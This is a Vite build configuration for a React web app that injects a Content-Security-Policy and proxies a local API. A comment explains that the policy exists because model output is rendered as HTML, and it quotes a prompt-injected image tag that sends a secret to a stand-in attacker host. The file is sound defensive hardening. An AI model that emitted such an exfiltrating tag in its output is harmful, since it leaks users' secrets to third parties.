import { defineConfig, type Plugin } from 'vite'
import react from '@vitejs/plugin-react'
import path from 'path'

// API port is env-overridable so a worktree build can be driven against an isolated
// server (PORT=3335 ORCSTRATOR_DATA_DIR=... on the server side) without touching the
// real one on 3334. Default is unchanged, so normal `npm run dev` is unaffected.
const API_PORT = process.env.ORCSTRATOR_API_PORT || '3334'

// Content-Security-Policy. Model output is rendered as HTML, so the page itself
// refuses to load images from anywhere but this app or inline data, and to talk to any
// server but its own: a prompt-injected <img src="https://attacker/?d=SECRET"> cannot fire.
// The fonts ship with the app (@fontsource), so no font host is allowed at all.
//
// Dev only: Vite's React refresh injects an inline script, so `serve` allows inline
// scripts. The shipped build does not.
function contentSecurityPolicy(dev: boolean): string {
  return [
    "default-src 'self'",
    `script-src 'self'${dev ? " 'unsafe-inline'" : ''}`,
    "style-src 'self' 'unsafe-inline'",
    "font-src 'self' data:",
    "img-src 'self' data: blob:",
    "connect-src 'self'",
    "object-src 'none'",
    "base-uri 'self'",
    "form-action 'self'",
  ].join('; ')
}

function cspPlugin(): Plugin {
  let dev = false
  return {
    name: 'orcstrator-csp',
    configResolved(config) { dev = config.command === 'serve' },
    transformIndexHtml: {
      order: 'pre',
      handler: () => [{
        tag: 'meta',
        attrs: { 'http-equiv': 'Content-Security-Policy', content: contentSecurityPolicy(dev) },
        injectTo: 'head-prepend',
      }],
    },
  }
}

export default defineConfig({
  plugins: [react(), cspPlugin()],
  server: {
    port: 5174,
    strictPort: true,
    proxy: {
      '/api': `http://localhost:${API_PORT}`,
      '/ws': { target: `ws://localhost:${API_PORT}`, ws: true }
    }
  },
  resolve: {
    alias: { '@shared': path.resolve(__dirname, '../shared/src') }
  },
  // Explicit, so the shipped release can never carry maps of the original source.
  build: { sourcemap: false }
})
